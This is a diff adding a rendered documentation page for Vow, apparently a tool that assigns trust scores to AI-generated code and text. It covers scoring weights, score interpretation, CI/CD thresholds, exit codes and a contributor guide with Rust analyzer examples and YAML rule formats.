+  writing_naturalness: 20%    # Human-like writing patterns
+  internal_consistency: 20%   # No self-contradictions
+</code></pre>
+<p><strong>Examples:</strong></p>
+<pre><code class="language-markdown">&lt;!-- High trust score --&gt;
+Python was created by Guido van Rossum and first released in 1991.
+The latest stable version can be found at https://python.org.
+
+&lt;!-- Low trust score --&gt;
+Python was invented in 1995 by John Smith at Google Corporation.
+Download it from https://python-official-new.com/downloads.
+</code></pre>
+<h3 id="security-analyzer-scoring"><a class="header" href="#security-analyzer-scoring">Security Analyzer Scoring</a></h3>
+<p>Security scoring focuses on:</p>
+<pre><code class="language-yaml">security_factors:
+  vulnerability_presence: 40%  # No dangerous patterns detected
+  secret_exposure: 30%         # No hardcoded credentials
+  permission_safety: 20%       # Safe privilege usage
+  injection_resistance: 10%    # No injection vulnerabilities
+</code></pre>
+<h2 id="score-interpretation-1"><a class="header" href="#score-interpretation-1">Score Interpretation</a></h2>
+<h3 id="confidence-levels"><a class="header" href="#confidence-levels">Confidence Levels</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Score Range</th><th>Confidence</th><th>Color</th><th>Meaning</th><th>Action</th></tr></thead><tbody>
+<tr><td>0.8 - 1.0</td><td>High</td><td>🟢 Green</td><td>Likely reliable</td><td>Use with minimal review</td></tr>
+<tr><td>0.6 - 0.8</td><td>Medium</td><td>🟡 Yellow</td><td>Some concerns</td><td>Review before use</td></tr>
+<tr><td>0.3 - 0.6</td><td>Low</td><td>🟠 Orange</td><td>Multiple issues</td><td>Careful review required</td></tr>
+<tr><td>0.0 - 0.3</td><td>Very Low</td><td>🔴 Red</td><td>Likely problematic</td><td>Significant review needed</td></tr>
+</tbody></table>
+</div>
+<h3 id="score-modifiers"><a class="header" href="#score-modifiers">Score Modifiers</a></h3>
+<p>Trust scores can be adjusted by various factors:</p>
+<h4 id="content-length-bonus"><a class="header" href="#content-length-bonus">Content Length Bonus</a></h4>
+<p>Longer, more detailed content gets slight bonuses:</p>
+<pre><code>length_bonus = min(0.1, log(content_length) / 100)
+</code></pre>
+<h4 id="consistency-bonus"><a class="header" href="#consistency-bonus">Consistency Bonus</a></h4>
+<p>Content that passes multiple analyzers gets reinforcement:</p>
+<pre><code>if all_analyzers_agree:
+    consistency_bonus = 0.05
+</code></pre>
+<h4 id="uncertainty-penalty"><a class="header" href="#uncertainty-penalty">Uncertainty Penalty</a></h4>
+<p>When analyzers disagree significantly:</p>
+<pre><code>if analyzer_disagreement &gt; 0.3:
+    uncertainty_penalty = 0.1
+</code></pre>
+<h2 id="factors-that-increase-trust-score"><a class="header" href="#factors-that-increase-trust-score">Factors That Increase Trust Score</a></h2>
+<h3 id="-positive-indicators"><a class="header" href="#-positive-indicators">✅ Positive Indicators</a></h3>
+<p><strong>Code:</strong></p>
+<ul>
+<li>All imports are from well-known packages</li>
+<li>Function calls match documented APIs</li>
+<li>Follows established coding conventions</li>
+<li>Includes proper error handling</li>
+<li>Has realistic variable names</li>
+</ul>
+<p><strong>Text:</strong></p>
+<ul>
+<li>Contains verifiable facts</li>
+<li>Uses real URLs and references</li>
+<li>Maintains consistent terminology</li>
+<li>Shows natural writing flow</li>
+<li>Includes appropriate caveats/disclaimers</li>
+</ul>
+<p><strong>Security:</strong></p>
+<ul>
+<li>No hardcoded credentials</li>
+<li>Safe API usage patterns</li>
+<li>Proper input validation</li>
+<li>Appropriate error handling</li>
+<li>Following security best practices</li>
+</ul>
+<h3 id="examples-of-high-trust-content"><a class="header" href="#examples-of-high-trust-content">Examples of High-Trust Content</a></h3>
+<pre><code class="language-python"># Score: 0.92 - Very trustworthy
+import requests
+import logging
+from typing import Optional, Dict
+
+logger = logging.getLogger(__name__)
+
+def fetch_github_user(username: str) -&gt; Optional[Dict]:
+    """Fetch user data from GitHub API."""
+    try:
+        url = f"https://api.github.com/users/{username}"
+        response = requests.get(url, timeout=10)
+        response.raise_for_status()
+        return response.json()
+    except requests.RequestException as e:
+        logger.error(f"Failed to fetch user {username}: {e}")
+        return None
+</code></pre>
+<h2 id="factors-that-decrease-trust-score"><a class="header" href="#factors-that-decrease-trust-score">Factors That Decrease Trust Score</a></h2>
+<h3 id="-negative-indicators"><a class="header" href="#-negative-indicators">❌ Negative Indicators</a></h3>
+<p><strong>Code:</strong></p>
+<ul>
+<li>Imports from non-existent packages</li>
+<li>Calls to fabricated functions</li>
+<li>Unusual or "magical" variable names</li>
+<li>Missing error handling</li>
+<li>Unrealistic functionality claims</li>
+</ul>
+<p><strong>Text:</strong></p>
+<ul>
+<li>Contradicts known facts</li>
+<li>Contains broken links/references</li>
+<li>Has unnatural writing patterns</li>
+<li>Makes unsupported claims</li>
+<li>Contains AI-typical phrases</li>
+</ul>
+<p><strong>Security:</strong></p>
+<ul>
+<li>Hardcoded API keys or passwords</li>
+<li>Dangerous function usage (eval, exec)</li>
+<li>Missing input validation</li>
+<li>Overly permissive operations</li>
+<li>Injection vulnerability patterns</li>
+</ul>
+<h3 id="examples-of-low-trust-content"><a class="header" href="#examples-of-low-trust-content">Examples of Low-Trust Content</a></h3>
+<pre><code class="language-python"># Score: 0.15 - Very suspicious
+import magic_ai_utils
+import super_advanced_ml
+
+def solve_everything(problem):
+    # This function can solve any problem automatically
+    solution = magic_ai_utils.auto_solve(problem)
+    enhanced_solution = super_advanced_ml.make_it_perfect(solution)
+    return enhanced_solution.get_final_answer()
+</code></pre>
+<h2 id="customizing-trust-score-calculation"><a class="header" href="#customizing-trust-score-calculation">Customizing Trust Score Calculation</a></h2>
+<h3 id="adjust-analyzer-weights"><a class="header" href="#adjust-analyzer-weights">Adjust Analyzer Weights</a></h3>
+<pre><code class="language-yaml"># .vow.yaml
+trust_score:
+  weights:
+    code: 0.5      # Increase code analyzer importance
+    text: 0.3      # Decrease text analyzer importance  
+    security: 0.2  # Keep security weight the same
+</code></pre>
+<h3 id="set-custom-thresholds"><a class="header" href="#set-custom-thresholds">Set Custom Thresholds</a></h3>
+<pre><code class="language-yaml">trust_score:
+  thresholds:
+    high: 0.85     # Raise bar for "high confidence"
+    medium: 0.65   # Custom medium threshold
+    low: 0.35      # Custom low threshold
+</code></pre>
+<h3 id="domain-specific-scoring"><a class="header" href="#domain-specific-scoring">Domain-Specific Scoring</a></h3>
+<pre><code class="language-yaml"># For data science projects
+trust_score:
+  domain: data_science
+  weights:
+    code: 0.3      # Less emphasis on perfect imports
+    text: 0.4      # More emphasis on documentation
+    security: 0.3  # Higher security concern for data
+</code></pre>
+<h2 id="understanding-score-components"><a class="header" href="#understanding-score-components">Understanding Score Components</a></h2>
+<h3 id="detailed-breakdown"><a class="header" href="#detailed-breakdown">Detailed Breakdown</a></h3>
+<p>Get detailed scoring information:</p>
+<pre><code class="language-bash"># Show score breakdown
+vow check file.py --show-score-breakdown
+
+# Output includes:
+# - Individual analyzer scores
+# - Weight contributions  
+# - Applied modifiers
+# - Final calculation
+</code></pre>
+<p>Example output:</p>
+<pre><code class="language-json">{
+  "trust_score": 0.73,
+  "breakdown": {
+    "code_analyzer": {
+      "score": 0.8,
+      "weight": 0.4,
+      "contribution": 0.32,
+      "factors": {
+        "import_validity": 0.9,
+        "api_authenticity": 0.7,
+        "syntax_correctness": 1.0,
+        "pattern_consistency": 0.6
+      }
+    },
+    "text_analyzer": {
+      "score": 0.65,
+      "weight": 0.35,
+      "contribution": 0.23
+    },
+    "security_analyzer": {
+      "score": 0.9,
+      "weight": 0.25,
+      "contribution": 0.23
+    },
+    "modifiers": {
+      "length_bonus": 0.02,
+      "consistency_bonus": 0.0,
+      "uncertainty_penalty": -0.05
+    }
+  }
+}
+</code></pre>
+<h2 id="trust-score-in-cicd"><a class="header" href="#trust-score-in-cicd">Trust Score in CI/CD</a></h2>
+<h3 id="setting-thresholds"><a class="header" href="#setting-thresholds">Setting Thresholds</a></h3>
+<pre><code class="language-yaml"># GitHub Actions example
+- name: Check AI output quality
+  run: |
+    vow check . --min-trust-score 0.7 --format sarif
+    
+# Exit codes based on trust score:
+# 0: All files meet threshold
+# 1: Some files below threshold  
+# 2: Critical issues found
+</code></pre>
+<h3 id="gradual-rollout"><a class="header" href="#gradual-rollout">Gradual Rollout</a></h3>
+<pre><code class="language-yaml"># Gradually increase standards
+trust_score:
+  thresholds:
+    # Week 1: Get baseline
+    required: 0.3
+    
+    # Week 2: Eliminate worst content  
+    # required: 0.5
+    
+    # Week 3: Raise the bar
+    # required: 0.7
+</code></pre>
+<h2 id="best-practices-3"><a class="header" href="#best-practices-3">Best Practices</a></h2>
+<h3 id="1-use-trust-scores-as-guidelines"><a class="header" href="#1-use-trust-scores-as-guidelines">1. Use Trust Scores as Guidelines</a></h3>
+<ul>
+<li>Don't rely solely on scores for critical decisions</li>
+<li>Combine with human review for important content</li>
+<li>Consider context and domain requirements</li>
+</ul>
+<h3 id="2-establish-team-standards"><a class="header" href="#2-establish-team-standards">2. Establish Team Standards</a></h3>
+<pre><code class="language-yaml"># team-standards.yaml
+trust_score:
+  production_code: 0.8    # High bar for production
+  documentation: 0.6      # Medium bar for docs
+  examples: 0.4           # Lower bar for examples
+  tests: 0.5              # Medium bar for tests
+</code></pre>
+<h3 id="3-monitor-score-distribution"><a class="header" href="#3-monitor-score-distribution">3. Monitor Score Distribution</a></h3>
+<pre><code class="language-bash"># Get score statistics for your codebase
+vow check . --stats --format json | jq '.trust_score_distribution'
+</code></pre>
+<h3 id="4-track-improvements"><a class="header" href="#4-track-improvements">4. Track Improvements</a></h3>
+<pre><code class="language-bash"># Compare scores over time
+vow check . --output baseline.json
+# ... make improvements ...
+vow check . --output improved.json --compare baseline.json
+</code></pre>
+<h2 id="limitations-1"><a class="header" href="#limitations-1">Limitations</a></h2>
+<h3 id="what-trust-scores-cant-tell-you"><a class="header" href="#what-trust-scores-cant-tell-you">What Trust Scores Can't Tell You</a></h3>
+<ul>
+<li><strong>Domain Expertise</strong>: Scores can't evaluate domain-specific correctness</li>
+<li><strong>Business Logic</strong>: Can't verify if code meets business requirements</li>
+<li><strong>Performance</strong>: Doesn't measure code efficiency or scalability</li>
+<li><strong>User Experience</strong>: Can't assess UI/UX quality</li>
+<li><strong>Integration</strong>: Doesn't verify how code works with other systems</li>
+</ul>
+<h3 id="when-to-ignore-trust-scores"><a class="header" href="#when-to-ignore-trust-scores">When to Ignore Trust Scores</a></h3>
+<ul>
+<li><strong>Prototype/Experimental Code</strong>: Lower scores expected</li>
+<li><strong>Legacy Code Integration</strong>: May trigger false positives</li>
+<li><strong>Highly Specialized Domains</strong>: May lack domain knowledge</li>
+<li><strong>Code Generation Templates</strong>: May be intentionally generic</li>
+</ul>
+<h2 id="next-steps-5"><a class="header" href="#next-steps-5">Next Steps</a></h2>
+<ul>
+<li><a href="reference/output-formats.html">Output Formats</a> - Understanding different output formats</li>
+<li><a href="reference/../configuration/config-file.html">Configuration</a> - Customize trust score calculation</li>
+<li><a href="reference/../guide/ci-cd-integration.html">CI/CD Integration</a> - Use trust scores in automation</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="exit-codes-1"><a class="header" href="#exit-codes-1">Exit Codes</a></h1>
+<p>Reference for all exit codes returned by Vow commands.</p>
+<h2 id="standard-exit-codes"><a class="header" href="#standard-exit-codes">Standard Exit Codes</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Code</th><th>Meaning</th><th>Description</th></tr></thead><tbody>
+<tr><td>0</td><td>Success</td><td>No issues found, operation completed successfully</td></tr>
+<tr><td>1</td><td>Issues Found</td><td>Analysis found issues (severity depends on --min-severity)</td></tr>
+<tr><td>2</td><td>Configuration Error</td><td>Invalid configuration file or options</td></tr>
+<tr><td>3</td><td>Model/Analyzer Error</td><td>ML model loading or analyzer execution failed</td></tr>
+<tr><td>4</td><td>File I/O Error</td><td>Cannot read input files or write output</td></tr>
+<tr><td>5</td><td>Network Error</td><td>Failed to download models or updates</td></tr>
+<tr><td>10</td><td>Internal Error</td><td>Unexpected internal error</td></tr>
+</tbody></table>
+</div>
+<h2 id="usage-in-scripts"><a class="header" href="#usage-in-scripts">Usage in Scripts</a></h2>
+<pre><code class="language-bash">#!/bin/bash
+
+vow check script.py
+exit_code=$?
+
+case $exit_code in
+  0)
+    echo "✅ No issues found"
+    ;;
+  1)
+    echo "⚠️  Issues found, review needed"
+    ;;
+  2)
+    echo "❌ Configuration error"
+    exit 1
+    ;;
+  *)
+    echo "❌ Unexpected error (code: $exit_code)"
+    exit 1
+    ;;
+esac
+</code></pre>
+<h2 id="cicd-integration-3"><a class="header" href="#cicd-integration-3">CI/CD Integration</a></h2>
+<p>Use exit codes to control build behavior:</p>
+<ul>
+<li><strong>Exit 0</strong>: Continue build</li>
+<li><strong>Exit 1</strong>: Continue with warnings or fail based on policy</li>
+<li><strong>Exit 2+</strong>: Fail build immediately</li>
+</ul>
+<p><em>This page is under development. See <a href="reference/../guide/ci-cd-integration.html">CI/CD Integration</a> for practical examples.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="contributing-to-vow"><a class="header" href="#contributing-to-vow">Contributing to Vow</a></h1>
+<p>Thank you for your interest in contributing to Vow! This guide will help you get started with contributing code, documentation, or ideas to make Vow better for everyone.</p>
+<h2 id="ways-to-contribute"><a class="header" href="#ways-to-contribute">Ways to Contribute</a></h2>
+<h3 id="-bug-reports"><a class="header" href="#-bug-reports">🐛 Bug Reports</a></h3>
+<p>Found a bug? Please check existing issues first, then create a new issue with:</p>
+<ul>
+<li>Steps to reproduce the problem</li>
+<li>Expected vs. actual behavior</li>
+<li>Your environment (OS, Vow version, etc.)</li>
+<li>Sample code/files that trigger the issue</li>
+</ul>
+<h3 id="-feature-requests"><a class="header" href="#-feature-requests">💡 Feature Requests</a></h3>
+<p>Have an idea for a new feature? Open an issue with:</p>
+<ul>
+<li>Clear description of the use case</li>
+<li>Why existing features don't solve the problem</li>
+<li>Proposed solution or API design</li>
+<li>Examples of how it would be used</li>
+</ul>
+<h3 id="-documentation"><a class="header" href="#-documentation">📝 Documentation</a></h3>
+<p>Help improve our docs by:</p>
+<ul>
+<li>Fixing typos or unclear explanations</li>
+<li>Adding examples and use cases</li>
+<li>Translating docs to other languages</li>
+<li>Creating tutorials and guides</li>
+</ul>
+<h3 id="-code-contributions"><a class="header" href="#-code-contributions">🔧 Code Contributions</a></h3>
+<p>Contribute code improvements:</p>
+<ul>
+<li>Bug fixes</li>
+<li>New analyzers or rules</li>
+<li>Performance improvements</li>
+<li>New output formats</li>
+<li>Test coverage improvements</li>
+</ul>
+<h2 id="development-setup"><a class="header" href="#development-setup">Development Setup</a></h2>
+<h3 id="prerequisites-2"><a class="header" href="#prerequisites-2">Prerequisites</a></h3>
+<ul>
+<li>Rust 1.70+ (<a href="https://rustup.rs/">rustup.rs</a>)</li>
+<li>Git</li>
+<li>Python 3.8+ (for integration tests)</li>
+<li>Node.js 16+ (for JavaScript analyzer tests)</li>
+</ul>
+<h3 id="clone-and-build"><a class="header" href="#clone-and-build">Clone and Build</a></h3>
+<pre><code class="language-bash"># Clone the repository
+git clone https://github.com/guanchuan1314/vow.git
+cd vow
+
+# Build in development mode
+cargo build
+
+# Run tests
+cargo test
+
+# Build documentation
+mdbook build docs/
+
+# Run integration tests
+python test/run_integration_tests.py
+</code></pre>
+<h3 id="development-workflow"><a class="header" href="#development-workflow">Development Workflow</a></h3>
+<ol>
+<li><strong>Fork the repository</strong> on GitHub</li>
+<li><strong>Create a feature branch</strong>: <code>git checkout -b feature/my-new-feature</code></li>
+<li><strong>Make your changes</strong> with tests and documentation</li>
+<li><strong>Run the test suite</strong>: <code>cargo test &amp;&amp; python test/run_integration_tests.py</code></li>
+<li><strong>Commit your changes</strong>: Use conventional commits format</li>
+<li><strong>Push to your fork</strong>: <code>git push origin feature/my-new-feature</code></li>
+<li><strong>Create a Pull Request</strong> on GitHub</li>
+</ol>
+<h2 id="code-style-and-standards"><a class="header" href="#code-style-and-standards">Code Style and Standards</a></h2>
+<h3 id="rust-code-style"><a class="header" href="#rust-code-style">Rust Code Style</a></h3>
+<p>We use <code>rustfmt</code> and <code>clippy</code> for consistent code style:</p>
+<pre><code class="language-bash"># Format code
+cargo fmt
+
+# Check for common issues
+cargo clippy -- -D warnings
+
+# Run both as pre-commit check
+cargo fmt --check &amp;&amp; cargo clippy -- -D warnings
+</code></pre>
+<h3 id="commit-messages"><a class="header" href="#commit-messages">Commit Messages</a></h3>
+<p>Use <a href="https://www.conventionalcommits.org/">Conventional Commits</a> format:</p>
+<pre><code>type(scope): description
+
+[optional body]
+
+[optional footer]
+</code></pre>
+<p>Examples:</p>
+<pre><code>feat(analyzer): add hallucination detection for Go imports
+fix(cli): handle empty files without panicking
+docs(readme): add installation instructions for Windows
+test(integration): add tests for SARIF output format
+</code></pre>
+<p>Types:</p>
+<ul>
+<li><code>feat</code>: New features</li>
+<li><code>fix</code>: Bug fixes</li>
+<li><code>docs</code>: Documentation changes</li>
+<li><code>test</code>: Test additions/changes</li>
+<li><code>refactor</code>: Code refactoring</li>
+<li><code>perf</code>: Performance improvements</li>
+<li><code>ci</code>: CI/CD changes</li>
+</ul>
+<h2 id="project-structure"><a class="header" href="#project-structure">Project Structure</a></h2>
+<pre><code>vow/
+├── src/
+│   ├── analyzers/          # Core analysis logic
+│   │   ├── code/          # Code analyzer
+│   │   ├── text/          # Text analyzer
+│   │   └── security/      # Security analyzer
+│   ├── cli/               # Command-line interface
+│   ├── config/            # Configuration handling
+│   ├── models/            # ML model interfaces
+│   ├── rules/             # Rule engine
+│   └── output/            # Output formatters
+├── test/
+│   ├── fixtures/          # Test files
+│   ├── integration/       # Integration tests
+│   └── unit/             # Unit tests
+├── models/               # Pre-trained model files
+├── docs/                 # Documentation source
+└── scripts/             # Build and release scripts
+</code></pre>
+<h2 id="writing-analyzers"><a class="header" href="#writing-analyzers">Writing Analyzers</a></h2>
+<h3 id="analyzer-interface"><a class="header" href="#analyzer-interface">Analyzer Interface</a></h3>
+<p>All analyzers implement the <code>Analyzer</code> trait:</p>
+<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>pub trait Analyzer: Send + Sync {
+    fn name(&amp;self) -&gt; &amp;str;
+    fn analyze(&amp;self, content: &amp;AnalysisInput) -&gt; Result&lt;AnalysisResult&gt;;
+    fn supported_languages(&amp;self) -&gt; &amp;[Language];
+}
+<span class="boring">}</span></code></pre></pre>
+<h3 id="example-analyzer"><a class="header" href="#example-analyzer">Example Analyzer</a></h3>
+<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>use crate::analyzer::{Analyzer, AnalysisInput, AnalysisResult, Issue};
+
+pub struct MyAnalyzer {
+    // Analyzer state/configuration
+}
+
+impl Analyzer for MyAnalyzer {
+    fn name(&amp;self) -&gt; &amp;str {
+        "my-analyzer"
+    }
+    
+    fn analyze(&amp;self, input: &amp;AnalysisInput) -&gt; Result&lt;AnalysisResult&gt; {
+        let mut issues = Vec::new();
+        
+        // Your analysis logic here
+        if self.detect_issue(&amp;input.content) {
+            issues.push(Issue {
+                rule: "my-rule".to_string(),
+                message: "Issue detected".to_string(),
+                severity: Severity::Medium,
+                line: 1,
+                column: 0,
+            });
+        }
+        
+        Ok(AnalysisResult {
+            trust_score: 0.8,
+            issues,
+        })
+    }
+    
+    fn supported_languages(&amp;self) -&gt; &amp;[Language] {
+        &amp;[Language::Python, Language::JavaScript]
+    }
+}
+<span class="boring">}</span></code></pre></pre>
+<h3 id="testing-analyzers"><a class="header" href="#testing-analyzers">Testing Analyzers</a></h3>
+<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>#[cfg(test)]
+mod tests {
+    use super::*;
+    
+    #[test]
+    fn test_analyzer_detects_issue() {
+        let analyzer = MyAnalyzer::new();
+        let input = AnalysisInput {
+            content: "problematic code here".to_string(),
+            language: Language::Python,
+            file_path: "test.py".into(),
+        };
+        
+        let result = analyzer.analyze(&amp;input).unwrap();
+        assert_eq!(result.issues.len(), 1);
+        assert_eq!(result.issues[0].rule, "my-rule");
+    }
+}
+<span class="boring">}</span></code></pre></pre>
+<h2 id="writing-rules-1"><a class="header" href="#writing-rules-1">Writing Rules</a></h2>
+<h3 id="rule-format"><a class="header" href="#rule-format">Rule Format</a></h3>
+<p>Rules are written in YAML format:</p>
+<pre><code class="language-yaml"># rules/my-rules.yaml
+name: "My Custom Rules"
+version: "1.0.0"
+description: "Custom rules for my project"
+
+rules:
+  - id: "custom-pattern"
+    name: "Detect Custom Pattern"
+    description: "Detects usage of custom problematic pattern"
+    severity: "medium"
+    
+    # Pattern matching
+    patterns:
+      - regex: "forbidden_function\\("
+        message: "forbidden_function() should not be used"
+      
+    # Language-specific patterns
+    languages:
+      python:
+        - regex: "import suspicious_module"
+          message: "suspicious_module is not allowed"
+      
+    # Context-aware rules
+    contexts:
+      - type: "function"
+        patterns:
+          - regex: "eval\\("
+            message: "eval() in functions is dangerous"
+</code></pre>
+<h3 id="testing-rules"><a class="header" href="#testing-rules">Testing Rules</a></h3>
+<pre><code class="language-bash"># Test rules against sample code
+vow rules test rules/my-rules.yaml test/fixtures/sample.py
+
+# Validate rule syntax
+vow rules validate rules/my-rules.yaml
+</code></pre>
+<h2 id="adding-output-formats"><a class="header" href="#adding-output-formats">Adding Output Formats</a></h2>
+<h3 id="output-format-interface"><a class="header" href="#output-format-interface">Output Format Interface</a></h3>
+<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>pub trait OutputFormatter: Send + Sync {
+    fn name(&amp;self) -&gt; &amp;str;
+    fn format(&amp;self, results: &amp;AnalysisResults) -&gt; Result&lt;String&gt;;
+    fn file_extension(&amp;self) -&gt; &amp;str;
+}
+<span class="boring">}</span></code></pre></pre>
+<h3 id="example-formatter"><a class="header" href="#example-formatter">Example Formatter</a></h3>
+<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
+</span><span class="boring">fn main() {
+</span>pub struct MyFormatter;
+
+impl OutputFormatter for MyFormatter {
+    fn name(&amp;self) -&gt; &amp;str {
+        "my-format"
+    }
+    
+    fn format(&amp;self, results: &amp;AnalysisResults) -&gt; Result&lt;String&gt; {
+        // Convert results to your format
+        let output = serde_json::to_string_pretty(results)?;
+        Ok(output)
+    }
+    
+    fn file_extension(&amp;self) -&gt; &amp;str {
+        "myformat"
+    }
+}
+<span class="boring">}</span></code></pre></pre>
+<h2 id="testing"><a class="header" href="#testing">Testing</a></h2>
+<h3 id="unit-tests"><a class="header" href="#unit-tests">Unit Tests</a></h3>
+<pre><code class="language-bash"># Run all unit tests
+cargo test
+
+# Run tests for specific module
+cargo test analyzers::code
+
+# Run tests with output
+cargo test -- --nocapture
+
+# Run tests in parallel
+cargo test -- --test-threads=4
+</code></pre>
+<h3 id="integration-tests"><a class="header" href="#integration-tests">Integration Tests</a></h3>
+<pre><code class="language-bash"># Run integration test suite
+python test/run_integration_tests.py
+
+# Run specific test category
+python test/run_integration_tests.py --category analyzers
+
+# Run with specific test files
+python test/run_integration_tests.py test/fixtures/python/
+</code></pre>
+<h3 id="adding-test-cases"><a class="header" href="#adding-test-cases">Adding Test Cases</a></h3>
+<p>Create test files in <code>test/fixtures/</code>:</p>
+<pre><code>test/fixtures/
+├── python/
+│   ├── good/              # Code that should pass
+│   │   ├── clean_code.py
+│   │   └── good_imports.py
+│   └── bad/              # Code that should fail  
+│       ├── hallucinated.py
+│       └── security_issues.py
+├── javascript/
+│   ├── good/
+│   └── bad/
+└── expected_results/     # Expected analysis results
+    ├── python_good_results.json
+    └── python_bad_results.json
+</code></pre>
+<h2 id="documentation"><a class="header" href="#documentation">Documentation</a></h2>
+<h3 id="building-documentation"><a class="header" href="#building-documentation">Building Documentation</a></h3>
+<pre><code class="language-bash"># Install mdBook
+cargo install mdbook
+
+# Build docs
+cd docs/
+mdbook build
+
+# Serve locally with live reload
+mdbook serve --open
+</code></pre>
+<h3 id="writing-documentation"><a class="header" href="#writing-documentation">Writing Documentation</a></h3>
+<ul>
+<li>Use clear, concise language</li>
+<li>Include practical examples</li>
+<li>Add code snippets with expected output</li>
+<li>Test all commands and examples</li>
+<li>Use proper markdown formatting</li>
+</ul>
+<h3 id="documentation-standards"><a class="header" href="#documentation-standards">Documentation Standards</a></h3>
+<ul>
+<li><strong>Headings</strong>: Use sentence case ("Getting started", not "Getting Started")</li>
+<li><strong>Code blocks</strong>: Always specify language for syntax highlighting</li>
+<li><strong>Commands</strong>: Show full commands with expected output</li>
+<li><strong>Links</strong>: Use relative links within the documentation</li>
+<li><strong>Images</strong>: Include alt text and keep images under 1MB</li>
+</ul>
+<h2 id="release-process"><a class="header" href="#release-process">Release Process</a></h2>
+<h3 id="versioning"><a class="header" href="#versioning">Versioning</a></h3>
+<p>We use <a href="https://semver.org/">Semantic Versioning</a>:</p>
+<ul>
+<li><code>MAJOR.MINOR.PATCH</code></li>
+<li>Major: Breaking changes</li>
+<li>Minor: New features (backward compatible)</li>
+<li>Patch: Bug fixes</li>
+</ul>
+<h3 id="release-checklist"><a class="header" href="#release-checklist">Release Checklist</a></h3>
+<ol>
+<li><strong>Update version</strong> in <code>Cargo.toml</code></li>
+<li><strong>Update CHANGELOG.md</strong> with new features/fixes</li>
+<li><strong>Run full test suite</strong>: <code>cargo test &amp;&amp; python test/run_integration_tests.py</code></li>
+<li><strong>Build documentation</strong>: <code>mdbook build docs/</code></li>
+<li><strong>Create release PR</strong> and get approval</li>
+<li><strong>Tag release</strong>: <code>git tag v1.2.3</code></li>
+<li><strong>Push tag</strong>: <code>git push origin v1.2.3</code></li>
+<li><strong>GitHub Actions</strong> will build and publish releases</li>
+</ol>
+<h2 id="community-guidelines"><a class="header" href="#community-guidelines">Community Guidelines</a></h2>
+<h3 id="code-of-conduct"><a class="header" href="#code-of-conduct">Code of Conduct</a></h3>
+<p>We follow the <a href="https://www.contributor-covenant.org/">Contributor Covenant</a>. Please:</p>
+<ul>
+<li>Be respectful and inclusive</li>
+<li>Welcome newcomers and help them learn</li>
+<li>Focus on constructive feedback</li>
+<li>Report unacceptable behavior to the maintainers</li>
+</ul>
+<h3 id="communication-channels"><a class="header" href="#communication-channels">Communication Channels</a></h3>
+<ul>
+<li><strong>GitHub Issues</strong>: Bug reports and feature requests</li>
+<li><strong>GitHub Discussions</strong>: Questions and general discussion</li>
+<li><strong>Pull Requests</strong>: Code review and collaboration</li>
+</ul>
+<h2 id="getting-help-1"><a class="header" href="#getting-help-1">Getting Help</a></h2>
+<h3 id="for-contributors"><a class="header" href="#for-contributors">For Contributors</a></h3>
+<ul>
+<li>Check existing issues and PRs first</li>
+<li>Read this contributing guide thoroughly</li>
+<li>Look at recent PRs for examples</li>
+<li>Ask questions in GitHub Discussions</li>
+</ul>
+<h3 id="for-maintainers"><a class="header" href="#for-maintainers">For Maintainers</a></h3>
+<ul>
+<li>Review PRs promptly and constructively</li>
+<li>Help new contributors get started</li>
+<li>Maintain coding standards</li>
+<li>Keep documentation up to date</li>
+</ul>
+<h2 id="recognition"><a class="header" href="#recognition">Recognition</a></h2>
+<p>Contributors are recognized in:</p>
+<ul>
+<li><code>CONTRIBUTORS.md</code> file</li>
+<li>Release notes</li>
+<li>Annual contributor spotlight</li>
+</ul>
+<p>Thank you for helping make Vow better! 🙏</p>
+<hr />
+<h2 id="quick-reference"><a class="header" href="#quick-reference">Quick Reference</a></h2>
+<h3 id="common-commands"><a class="header" href="#common-commands">Common Commands</a></h3>
+<pre><code class="language-bash"># Development build
+cargo build
+
+# Run tests  
+cargo test
+
+# Format code
+cargo fmt
+
+# Check code quality
+cargo clippy
+
+# Build docs
+mdbook build docs/
+
+# Test rules
+vow rules test rules/my-rules.yaml test.py
+</code></pre>
+<h3 id="useful-resources"><a class="header" href="#useful-resources">Useful Resources</a></h3>
+<ul>
+<li><a href="https://doc.rust-lang.org/book/">Rust Book</a></li>
+<li><a href="https://doc.rust-lang.org/cargo/">Cargo Guide</a></li>
+<li><a href="https://rust-lang.github.io/mdBook/">mdBook Guide</a></li>
+<li><a href="https://www.conventionalcommits.org/">Conventional Commits</a></li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+        <script>
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+    </div>
+    </body>
+</html>
